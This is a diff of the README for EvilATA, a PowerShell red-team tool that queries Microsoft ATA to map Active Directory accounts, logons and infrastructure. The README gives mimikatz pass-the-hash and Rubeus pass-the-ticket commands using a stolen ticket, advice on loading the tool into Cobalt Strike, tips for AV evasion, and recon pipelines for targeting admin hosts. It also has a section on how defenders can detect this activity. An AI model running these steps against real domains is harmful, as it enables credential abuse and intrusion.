@@ -17,13 +17,15 @@ ATA 有一项功能可以有效提升甲方安全人员的使用效率：即可�
 
 ![img_5b25fceb4d1b5](README/img_5b25fceb4d1b5.png)
 
-试想如果攻击者在内网取得了 ATA 的访问权限，那么这些信息对其来说同样用处巨大：红队大量域渗透的前期侦查工作均可直接通过 ATA 进行，且可以有效避开安全设备的检测（这是因为不直接与域内的成员机发生交互），例如：
+红方进入一个域后，如何快速、高效定位基础设施和高权限账号的所在位置是一个重要课题。
+
+试想如果攻击者在内网取得了 ATA 的访问权限，那么这些信息对其来说意义巨大：红队大量域渗透的前期侦查工作均可直接通过 ATA 进行，且可以有效避开安全设备的检测（这是因为不直接与域内的成员机发生交互），例如：
 
 > 1、定位高权限域安全组及其成员；
 >
 > 2、快速定位域内重要的 AD 组件和基础设施（ADCS、ADFS、DC、SCCM、WSUS、EXCHANGE）；
 >
-> 3、查看高权限账户或特定账户登录过哪些计算机，以快速针对性打点；
+> 3、查看高权限账户或特定账户最近登录过哪些计算机，以快速针对性打点；
 >
 > 4、查看目标计算机被哪些用户登录过，以快速针对性打点；
 >
@@ -48,10 +50,10 @@ ATA Server 搭建完成后会新建三个本地安全组（🔗 https://learn.mi
 ## Features
 
 * EvilATA 使用 Windows 原生 PowerShell，无需多余编程环境支持；
-* 文件结构简单，可直接通过 cobalt strike 利用 PowerShell-import 载入 beacon；
+* 文件结构简单，可直接通过 cobaltstrike 利用 powershell-import 载入 beacon；
 * 利用过程均为 PowerShell 对象输出，灵活性高、格式化输出文件方便二次利用；
-* 可输出 CSV、Json、TXT 等格式（只要是 PowerShell 支持的）；
-* 混淆、免杀方便（除 Windows Defender）；
+* 可输入输出 CSV、Json、TXT 等格式（只要是 PowerShell 支持的），文本处理简单；
+* 混淆、免杀方式多，且常规杀软针对 PowerShell 的检测较弱（Windows Defender 除外）；
 
 ![Screenshot2022-12-21 15.42.28](README/Screenshot2022-12-21%2015.42.28.jpg)
 
@@ -60,6 +62,7 @@ EvilATA 基于以下项目开发：
 ```
 https://github.com/PowerShellMafia/PowerSploit
 https://github.com/microsoft/Advanced-Threat-Analytics
+https://github.com/RamblingCookieMonster/Invoke-Parallel
 ```
 
 ## Installation
@@ -73,14 +76,14 @@ https://github.com/microsoft/Advanced-Threat-Analytics
 
 ```
 PS c:\> git clone https://github.com/NickYan7/EvilATA.git
-PS c:\> . .\EvilATA.ps1
+PS c:\> ipmo .\EvilATA.ps1
 
 // ** 注意 ** Notice **
-// 每次载入 EvilATA 之后，需要首先配置你所在域的 ATA Server 域名
+// 每次载入 EvilATA 之后，需要首先配置你所在域的 ATA Server 域名（或者 IP）
 PS c:\> Set-ATACenterURL "ata.yourdomain.com"
 ```
 
-载入 EvilATA 库时将自动载入 PowerView。目前原版 PowerView 已被标记为恶意，请自行免杀。
+载入 EvilATA 库时将自动载入 PowerView 和 Invoke-Parallel。目前原版 PowerView 已被标记为恶意，请自行免杀。
 
 ## Usage
 
@@ -89,20 +92,22 @@ PS c:\> Set-ATACenterURL "ata.yourdomain.com"
 以企业安全人员使用 EvilATA 非常简单，其默认已具备了域内查询权限和 ATA 访问权限。只需载入 EvilATA 库，确保 PowerView 没有被拦截即可。
 
 ```
-PS c:\> . .\EvilATA.ps1
+PS c:\> ipmo .\EvilATA.ps1
 PS c:\> Set-ATACenterURL "ata.yourdomain.com"
 PS c:\> Get-ATAUniqueEntity (Get-NetUser administrator).objectguid
 PS c:\> Get-ATAUniqueEntity (Get-NetUser administrator).objectguid -Profile
 ```
 
+**EvilATA 通过 ObjectGuid 定位域对象（ATA 也是如此）。** 因此 `-Id` 参数的实参必须是域内一个对象的 ObjectGuid 值，域对象的 ObjectGuid 属性一般使用 PowerView 进行查询。
+
 EvilATA 提供了 4 项基础 Cmd-Let（即 Abusing Advanced Threat Analytics PowerShell module 所提供的）：
 
-```
-Get-ATAMonitoringAlert
-Get-ATAStatus
-Get-ATASuspiciousActivity
-Get-ATAUniqueEntity
+* Get-ATAMonitoringAlert
+* Get-ATAStatus
+* Get-ATASuspiciousActivity
+* Get-ATAUniqueEntity
 
+```
 PS c:\> man Get-ATAUniqueEntity
 
 NAME
@@ -181,10 +186,10 @@ PS c:\> klist
 2、此时便可以通过该 HTTP 票据访问 ATA 数据：
 
 ```
+PS c:\> ipmo .\EvilATA.ps1
+PS c:\> Set-ATACenterURL "ata.yourdomain.com"
 PS c:\> Get-ATAUniqueEntity "<objectguid>" -Profile | select -ExpandProperty logon* | sort logontime -Descending | ft -auto
 ```
-
-**EvilATA 通过 ObjectGuid 定位域对象（ATA 也是如此）。** 因此 `-Id` 参数的实参必须是域内一个对象的 ObjectGuid 值。
 
 ⚠️ TGS 票据默认有效时长 10 小时。
 
@@ -206,7 +211,7 @@ PS c:\> runas /netonly /user:yourdomain\nick PowerShell
 PS c:\> mimikatz "sekurlsa::pth /domain:yourdomain.com /user:nick /ntlm:<ntlm_hash>" exit
 ```
 
-通过这两种方式可拿到一个具备域用户基础凭据的 Shell。
+这两种方式任选一种均可拿到一个具备域用户基础凭据的 Shell。
 
 3、载入 EvilATA 库，使用 `ptt` 载入安全人员的 HTTP/ata.yourdomain.com 的票据，进行利用：
 
@@ -214,7 +219,7 @@ PS c:\> mimikatz "sekurlsa::pth /domain:yourdomain.com /user:nick /ntlm:<ntlm_ha
 PS c:\> rubeus ptt /ticket:http.kirbi
 
 // EvilATA 中已自动载入 PowerView 库
-PS c:\> . .\EvilATA.ps1
+PS c:\> ipmo .\EvilATA.ps1
 PS c:\> Set-ATACenterURL "ata.yourdomain.com"
 ```
 
@@ -222,10 +227,10 @@ PS c:\> Set-ATACenterURL "ata.yourdomain.com"
 
 ### 示例 1：查询域管理员组中的账户登录了哪些域内计算机及其 IP
 
-**EvilATA 通过 ObjectGuid 定位域对象（ATA 也是如此）。** 因此 `-Id` 参数的实参必须是域内一个对象的 ObjectGuid 值。
+**EvilATA 通过 ObjectGuid 定位域对象（ATA 也是如此）。** 因此 `-Id` 参数的实参必须是域内一个对象的 ObjectGuid 值，域对象的 ObjectGuid 属性一般使用 PowerView 进行查询。
 
 ```
-PS c:\> (Get-NetGroup "domain admins").member | %{Get-NetUser $_} | %{Get-ATAUniqueEntity $_.objectguid -Profile} | select -exp logon* | Add-Member -MemberType ScriptProperty -Name "IPAddress" -Value {(Get-ATAUniqueEntity $this.logoncomputerguid -Profile | select -exp ipaddress* | sort date -Descending)[0].ipaddress} -PassThru | ft -auto
+PS c:\> (Get-NetGroup "domain admins").member | %{Get-NetUser $_} | %{Get-ATAUniqueEntity $_.objectguid -Profile} | select -exp logon*
 ```
 
 ![Screenshot2022-12-21 16.10.27](README/Screenshot2022-12-21%2016.10.27.jpg)
@@ -238,7 +243,7 @@ PS c:\> (Get-NetGroup "Exchange Trusted Subsystem").member | %{Get-NetComputer $
 
 ![Screenshot2022-12-21 16.20.23](README/Screenshot2022-12-21%2016.20.23.jpg)
 
-可以关注的 Property 包括但不限于：
+可关注的 Property 包括但不限于：
 
 ```
 AccessedResourceAccountIdToTimeMapping
@@ -256,9 +261,80 @@ UpdateTime
 
 结合 PowerView 利用 EvilATA，只要你熟悉 PowerShell 中「万物皆是对象」和「管道传输对象」两个概念，便可以拓展出非常多侦查场景，可以极大提高域渗透侦查的效率。
 
-传统的 SAMR 协议查询（即 net * /domain 命令、wmic 命令）如今已经非常容易被检测到，如果你进入一个域后还在执行 `net group "domain admins" /domain` 、 `net user administrator /domain` 这种命令，那么暴露的概率不是 100%，而是 200%。
+传统的 SAMR 协议查询（即 net xxx /domain 命令、wmic 命令）如今已经非常容易被检测到，如果你进入一个域后还在执行 `net group "domain admins" /domain` 、 `net user administrator /domain` 这种命令，那么暴露的概率不是 100%，而是 200%。
 
 在域内如果有 ATA 作为安全监测设备（那么可以肯定这家企业对于 AD 的安全建设已在一定水平），则优先利用 ATA 进行侦查；如果没有 ATA，则使用 PowerView 或者 PowerShell AD Module 是比较好的选择（或者 ADFind）。
+
+### 示例 3：查询某 OU 下的所有人员的主机登录情况
+
+例如针对某 OU 下 28 个域用户对象进行查询，返回 715 个域计算机对象作为结果保存为一个变量，测试耗时 6 分 40 秒。后续只需针对该变量进行条件查询：
+
+```
+PS c:\> $result = Get-NetUser -SearchBase "OU=IT,DC=yourdomain,DC=com" | %{Get-ATAUniqueEntity $_.objectguid -Profile} | select -exp logon*
+```
+
+然后从 28 个用户中进行筛选，以登录时间排序其最近登录的计算机，并输出 IP：
+
+```
+PS c:\> $result.identityrefer | select -unique
+PS c:\> $result |? identityrefer -eq "nick" | sort logontime -Descending | ft -auto
+```
+
+![Screenshot2022-12-22 20.53.22](README/Screenshot2022-12-22%2020.53.22.jpg)
+
+从 `$result` 中筛选出被登录次数最多的计算机从而发起针对性攻击：
+
+```
+PS c:\> $result | Group-Object atasamname | sort count -Descending
+```
+
+![Screenshot2022-12-22 20.32.27](README/Screenshot2022-12-22%2020.32.27.jpg)
+
+## Detection
+
+对于甲方安全建设人员，可以从以下思路加强对此类恶意活动的监测：
+
+### 1、加强 ATA Server 访问权限管控
+
+ATA 的访问权限由 ATA Server 的本地安全组进行控制，无法从外部或域控进行查询，理论上只有 ATA Server 管理员具有查阅。所以需严格控制 ATA Server 的管理员权限。
+
+### 2、对频繁访问 ATA 的行为进行监控
+
+一般安全人员通过登录 ATA WEB 平台进行浏览，这种访问方式短时间内不会产生高频次的 Access 记录。
+
+而 EvilATA 本质上是一种爬虫行为，通过 EvilATA 访问 ATA 会产生大量访问记录（被窃取账号的 HTTP 票据访问记录），可通过该特征监测短时间内大量访问 ATA 的账号和计算机，当判定为账号陷落时需立刻展开应急响应活动。
+
+## Update
+
+### 12-21-2022
+
+> 1、优化查询逻辑，将域计算机对象和域用户对象的查询方式分开；
+>
+> 2、更新了 Get-ATAUniqueEntity 中域用户对象的 LogonComputerIdToTimeMapping 属性，现可输出 ComputerName、ATASamName 属性；
+>
+> 3、更新了 Get-ATAUniqueEntity 中域计算机对象的 LogonSourceAccountIdToTimeMapping 属性，现可输出 LogonUserName、ATASamName 属性；
+>
+> 4、更新了 Get-ATAUniqueEntity 中域计算机对象的 IPAddressToTimeMapping 属性，现可输出 DnsHostName、Date（连接到域控时的 IP 的接入时间）属性；
+>
+> 5、对 Get-ATAUniqueEntity 中涉及时间的属性均格式化为本地时间，增强可读性。
+
+### 12-22-2022
+
+> 1、解决了一处 if/else 逻辑缺陷导致的输出对象重复；
+>
+> 2、加入了 Invoke-Parallel 库，大幅提升运行速度。测试优化前抓取 72 个对象耗时 1 分 14 秒，优化后抓取 72 个对象耗时 35 秒，速度提升 52%；
+>
+> 3、解决了 Invoke-Parallel 无法调用外部库的问题，解决了 Invoke-Parallel 和 Add-Member 的适配问题；
+>
+> 4、现执行查询时带有进度条展示；
+>
+> 5、解决了多线程 Runspace 下嵌套调用 EvilATA 的问题；
+>
+> 6、优化了 Get-ATAUniqueEntity 中域用户对象的 LogonComputerIdToTimeMapping 属性，现可输出每一台登录计算机的 IP（最后一次与域控通信时）；
+>
+> 7、更新了 Get-ATAUniqueEntity 中域用户对象的 AccessedResourceAccountIdToTimeMapping 属性，现可输出用户访问的所有资源对象的 AccessedResourceName、IPAddress、AccessedTime；
+
+
 
 ## Disclaimer
 
@@ -276,7 +352,9 @@ UpdateTime
 
 > 1、优化安全事件的输出；
 >
-> 2、debug...
+> 2、优化 EvilATA 载入 cobaltstrike beacon；
+>
+> 3、优化 Invoke-Parallel 潜在的 Bug；
 
 如果有任何建议或者遇到 Bug，欢迎提 Issue。
 
